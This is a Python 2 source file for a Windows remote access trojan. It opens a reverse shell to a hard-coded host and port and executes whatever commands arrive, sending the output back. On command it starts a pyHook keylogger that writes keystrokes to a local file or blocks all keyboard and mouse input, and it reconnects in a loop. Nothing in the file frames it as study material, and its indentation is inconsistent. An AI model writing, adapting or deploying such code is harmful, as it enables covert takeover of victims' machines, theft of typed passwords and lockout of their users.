#! /usr/bin/env python

import pythoncom
import pyHook
import socket
import subprocess
import sys
import time

HOST = '127.0.0.1'   
PORT = 22

def callLogKeys(event):
    # 0 is for NULL 8 is for Backspace
    if event.Ascii != 0 or 8:
        file=open('c:\output.txt','r+')
        buffer = file.read()
        file.close()
    file = open('c:\output.txt','w')
    recordKeys = chr(event.Ascii)
    # 13 is for Enter
    if event.Ascii == 13:
        recordKeys = '\n'
    buffer = buffer + recordKeys
    file.write(buffer)
    file.close()

def manageLoggedKeys():
    hookManager = pyHook.HookManager()
    # This calls the function callLogKeys()
    hookManager.KeyDown = callLogKeys
    hookManager.HookKeyboard()
    # Waits 
    pythoncom.PumpMessages()

def setBlock(event):    
    return False    
    
def blockInput():    
    hookManager = pyHook.HookManager()    
    hookManager.MouseAll = setBlock    
    hookManager.KeyAll = setBlock    
    hookManager.HookMouse()    
    hookManager.HookKeyboard()    
    pythoncom.PumpMessages()    
    
def connect((host, port)):
	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketHolder.connect((host, port))
	return socketHolder

def run_shell_cmd(socketHolder):
	data = socketHolder.recv(1024)
	if data:
		if data == "exit":
			socketHolder.close()
			sys.exit(0)
                elif data == 'logKeys':
                     manageLoggedKeys()
                elif data == 'blockInput':
                        blockInput()
                elif len(data) == 0:
			return True
		else:
			proc = subprocess.Popen(data, shell=True,
				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			socketHolder.send(stdout_value)
			return False
	else:
		print 'Lost connection to host. Will attempt to reconnect.'
		socketHolder = connect((HOST,PORT))

def main():
	socketAlive = True
        while socketAlive:
		dataReceived = True
                try:
                        socketHolder = connect((HOST,PORT))
			socketHolder.send('You have control')
                        while dataReceived:
				commandsFromMaster = run_shell_cmd(socketHolder)
                        socketHolder.close()
                except socket.error:
                        pass

if __name__ == "__main__":
        sys.exit(main())
